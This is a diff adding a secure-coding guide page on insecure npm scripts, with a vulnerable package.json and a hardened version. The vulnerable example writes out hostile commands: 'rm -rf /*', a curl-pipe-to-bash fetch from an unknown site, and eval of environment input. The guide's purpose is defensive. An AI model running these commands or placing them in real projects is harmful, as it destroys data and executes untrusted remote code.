@@ -1,0 +1,143 @@
+---
+title: Insecure NPM Scripts
+description: Securing npm scripts and preventing script injection attacks
+---
+
+# Insecure NPM Scripts
+
+## Common Misconfigurations
+
+1. **Running untrusted packages' scripts automatically**
+2. **Using unsafe script commands**
+3. **Not validating environment variables in scripts**
+4. **Missing script injection protection**
+5. **Excessive permissions in scripts**
+
+## Vulnerable Example
+
+```json
+// package.json with insecure scripts
+{
+  "name": "insecure-scripts-app",
+  "scripts": {
+    // Command injection vulnerability
+    "build": "echo Building $npm_package_version && webpack",
+    
+    // Unsafe rm command
+    "clean": "rm -rf /*",
+    
+    // Downloading and executing remote scripts
+    "setup": "curl -s https://unknown-site.com/script.sh | bash",
+    
+    // Using eval with user input
+    "process": "node -e \"eval(process.env.USER_INPUT)\"",
+    
+    // No validation on file operations
+    "deploy": "cp -r ./* $DEPLOY_PATH",
+    
+    // Running with elevated privileges
+    "install": "sudo npm link"
+  }
+}
+
+// No .npmrc security settings
+// No ignore-scripts configuration
+```
+
+## Secure Solution
+
+```json
+// package.json with secure scripts
+{
+  "name": "secure-scripts-app",
+  "scripts": {
+    // Safe, validated commands
+    "build": "node scripts/build.js",
+    "clean": "node scripts/clean.js",
+    "test": "jest --coverage",
+    "lint": "eslint src/",
+    
+    // Use npm run-script for chaining
+    "prebuild": "npm run clean",
+    "postbuild": "npm run test",
+    
+    // Validated deployment
+    "deploy": "node scripts/deploy.js --validate"
+  }
+}
+```
+
+```settings
+# .npmrc with security configurations
+ignore-scripts=true
+audit-level=moderate
+fund=false
+```
+
+```code
+// scripts/build.js - Secure build script
+const { execSync } = require('child_process');
+const path = require('path');
+
+// Validate environment
+const version = process.env.npm_package_version;
+if (!/^\d+\.\d+\.\d+$/.test(version)) {
+  throw new Error('Invalid version format');
+}
+
+// Use safe paths
+const buildPath = path.join(__dirname, '..', 'dist');
+
+// Execute with limited permissions
+try {
+  execSync('webpack --mode production', {
+    stdio: 'inherit',
+    cwd: process.cwd(),
+    env: {
+      ...process.env,
+      NODE_ENV: 'production'
+    }
+  });
+} catch (error) {
+  console.error('Build failed:', error.message);
+  process.exit(1);
+}
+```
+
+```code
+// scripts/clean.js - Safe cleanup script
+const fs = require('fs').promises;
+const path = require('path');
+
+const ALLOWED_PATHS = ['dist', 'build', '.cache'];
+
+async function clean() {
+  for (const dir of ALLOWED_PATHS) {
+    const fullPath = path.join(process.cwd(), dir);
+    
+    // Validate path is within project
+    if (!fullPath.startsWith(process.cwd())) {
+      console.error(`Invalid path: ${dir}`);
+      continue;
+    }
+    
+    try {
+      await fs.rm(fullPath, { recursive: true, force: true });
+      console.log(`Cleaned: ${dir}`);
+    } catch (error) {
+      // Directory doesn't exist, skip
+    }
+  }
+}
+
+clean().catch(console.error);
+```
+
+## Best Practices
+
+* Set ignore-scripts=true in .npmrc.
+* Validate all environment variables.
+* Use dedicated script files instead of inline commands.
+* Avoid shell command execution when possible.
+* Implement proper input validation.
+* Never use eval() or Function() with user input.
